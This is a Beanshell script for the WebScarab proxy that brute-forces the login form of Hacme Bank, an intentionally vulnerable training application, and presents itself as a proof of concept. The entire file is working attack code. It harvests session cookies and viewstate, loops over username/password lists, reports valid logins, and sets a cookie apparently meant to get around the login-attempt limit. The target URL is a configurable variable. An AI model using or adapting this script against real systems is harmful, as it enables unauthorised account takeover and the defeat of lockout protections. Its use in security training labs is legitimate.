import org.owasp.webscarab.model.ConversationID;
import org.owasp.webscarab.model.HttpUrl;
import org.owasp.webscarab.model.Request;
import org.owasp.webscarab.model.Response;
import org.owasp.webscarab.util.Encoding;
import org.owasp.webscarab.model.NamedValue;

// Beanshell script by Chuck Willis (chuck at securityfoundry dot com)
// for use with WebScarab by Rogan Dawes 
// http://www.owasp.org/software/webscarab.html
// Use this script at your own risk, by using it you accept all liability.

// This script will brute force the log in form to a copy of Foundstone's Hacme Bank
// (http://www.foundstone.com/resources/proddesc/hacmebank.htm)
// It is meant as a proof of concept for brute forcing form values.

// This script works by establishing a new session for each request, getting
// a new cookie each time.  So, each brute force attempt makes two requests,
// one to get the homepage and then another to post the login attempt using the
// cookie and viewstate taken from the initial request.

// This script does not make any parallel requests, after each request, the 
// script does not continue until a response is received.
// This makes the script simpler, but results in lower performance than the 
// other version which makes parallel requests.

// Since this script does not log all requests made to the web site,
// you may want to try running this script through another proxy
// to get a better feel for what it is doing.

// !! you must configure the URL variable below to make this script work !!

String hacmebankURL = "http://192.168.1.2/hacmebank/";

// configuration items...
boolean showBadLogins = false; // if true, show invalid login combos
boolean scriptDebug = false; // if true, more details are printed...
boolean tryEachCombo = true; // if true, try each username with each password
	// otherwise, just try each username with the associated password

String[] listOfUsernames = { "test", "owasp", "webappsec", "jc", "a", "jv", "a", "a", "a", "a" };
String[] listOfPasswords = { "test", "owasp", "webappsec", "jc789", "a", "a", "jv789", "a", "a", "a" };
//String[] listOfUsernames = { "test", "owasp", "webappsec", "jc", "a", "jv", "a", "a", "a", "a" , "test", "owasp", "webappsec", "jc", "a", "jv", "a", "a", "a", "a" };
//String[] listOfPasswords = { "test", "owasp", "webappsec", "jc789", "a", "a", "jv789", "a", "a", "a", "test", "owasp", "webappsec", "jc789", "a", "a", "jv789", "a", "a", "a" };

// define subroutines first, then call mainLoop at the end of this file....
void mainLoop() {
	long startTime = System.currentTimeMillis();
	if(tryEachCombo) {
    for (int i = 0 ; i < listOfUsernames.length; i++)	{
      for (int j = 0 ; j < listOfPasswords.length; j++)	{
				getParamsAndLogin(listOfUsernames[i], listOfPasswords[j]);
			}
		}
	} else {
		int smallerLength;  // the smaller of the lengths of the password and username arrays
		if (listOfUsernames.length < listOfPasswords.length) {
		    out.println("Not enough usernames...");
		    smallerLength = listOfUsernames.length;
 		} else if (listOfUsernames.length > listOfPasswords.length) {
		    out.println("Not enough passwords...");
		    smallerLength = listOfPasswords.length ;
 		} else if (listOfUsernames.length == listOfPasswords.length) {
		    smallerLength = listOfPasswords.length ;
 		}
	 	for (int i = 0 ; i < smallerLength; i++)	{
			getParamsAndLogin(listOfUsernames[i], listOfPasswords[i]);
		}
	}
	long elapsedTime = System.currentTimeMillis() - startTime;
	if (tryEachCombo) out.println("Checked " + (listOfUsernames.length*listOfPasswords.length) + " combos in " + elapsedTime/1000 + " seconds");
	else out.println("Run took " + elapsedTime/1000 + " seconds");
}

// this is the function that does the work... grab the homepage, parse the cookie
// and viewstate, then post the form.
void getParamsAndLogin(String username, String password) {
	Response homepage = fetchURL(hacmebankURL);
	//scripted.addConversation(homepage);
	if(scriptDebug) out.println("Fetched Homepage");
	String cookie = getCookie("ASP.NET_SessionId", homepage);
	if(scriptDebug) out.println("Parsed Cookie:" + cookie);
	String viewstate = getFormValue("__VIEWSTATE", homepage);
	if(scriptDebug) out.println("Parsed Viewstate:" + viewstate);
	Response loginResponse = login(hacmebankURL + "Login.aspx",
		cookie, viewstate, username, password);
	//scripted.addConversation(loginResponse);
	if(loginResponse.toString().indexOf("Invalid") != -1) { // if response contains "Invalid"
		if (showBadLogins) out.println("   Bad Login: " + username + " Password: " + password);
	} else {
		out.println("! Valid Login: " + username + " Password: " + password);
	}
}

Response fetchURL(String url) {
	Request request = new Request();
	request.setMethod("GET");
	request.setVersion("HTTP/1.0");
	request.setHeader("User-Agent","WebScarab");
	request.setURL(new HttpUrl(url));
	Response response = scripted.fetchResponse(request);
	return response;
}

// this function would be a lot easier if it was not possible for the server to
// return more than one Set-Cookie header...we could just call response.getHeader("Set-Cookie");
String getCookie(String cookiename, Response response) {
	NamedValue[] headers = response.getHeaders();
	String cookievalue = null;
	for (int i=0; i<headers.length; i++) {
	  //if(scriptDebug) out.println("HeaderName: " + headers[i].getName() + " HeaderValue: " + headers[i].getValue());
		if (headers[i].getName().equalsIgnoreCase("Set-Cookie")) {
		  if (headers[i].getValue().startsWith(cookiename)) { // if header value starts with the cookiename
        cookievalue = headers[i].getValue().substring(headers[i].getValue().indexOf("=")+1,
				 	headers[i].getValue().indexOf(";"));
      }
  	}
	}
  return cookievalue;
}

// this function will only return the first instance of the form value name
// and will probably choke if valuename appears in regular text before it appears
// in a form
String getFormValue(String valuename, Response response) {
	String resp = response.toString();
	int startname = resp.indexOf(valuename); // index of first character of the value name
	// example line : <input type="hidden" name="name"    value="value" />
	// end of form value name and beginning of form value ...
	int startvalue = resp.indexOf("\"", startname+valuename.length()+1) + 1; // index of the
	  // first character of the value
	return resp.substring(startvalue,
		resp.indexOf("\"", startvalue)); // substring does not include the final ", so this is correct
		  // no -1 needed

}

// post the login form.
Response login(String url, String cookie, String viewstate, String username, String password) {
	Request request = new Request();
	request.setMethod("POST");
	request.setVersion("HTTP/1.0");
	//request.setHeader("Host", "192.168.1.1");
	request.setHeader("User-Agent","WebScarab");
	request.setHeader("Content-Type", "application/x-www-form-urlencoded");
	request.setHeader("Cookie","ASP.NET_SessionId="+cookie+"; CookieLoginAttempts=4");
	request.setURL(new HttpUrl(url));
	String body = new String("__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE="+
		Encoding.urlEncode(viewstate) +
		"&txtUserName=" + Encoding.urlEncode(username) +
		"&txtPassword=" + Encoding.urlEncode(password) +
		"&btnSubmit=Submit");
	request.setHeader("Content-Length",body.length().toString());
	request.setContent(body.getBytes());
	if(scriptDebug) out.println("Sending Request:" + request.toString());
	Response response = scripted.fetchResponse(request);
	return response;
}

mainLoop();


